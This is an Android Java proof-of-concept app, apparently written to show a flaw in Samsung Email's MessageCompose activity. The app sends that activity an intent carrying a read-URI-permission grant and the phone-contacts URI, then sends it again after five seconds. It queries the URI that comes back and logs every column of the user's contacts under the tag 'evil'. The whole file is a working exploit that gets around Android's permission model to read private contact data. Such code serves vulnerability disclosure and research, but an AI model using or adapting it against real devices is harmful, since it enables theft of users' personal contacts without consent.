package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Log;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        i.setData(ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
        i.setClassName("com.samsung.android.email.provider", "com.samsung.android.email.composer.activity.MessageCompose");
        startActivityForResult(i, 0);
        new Handler().postDelayed(() -> startActivityForResult(i, 0), 5000);
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        dump(data.getData());
    }

    public void dump(Uri uri) {
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
}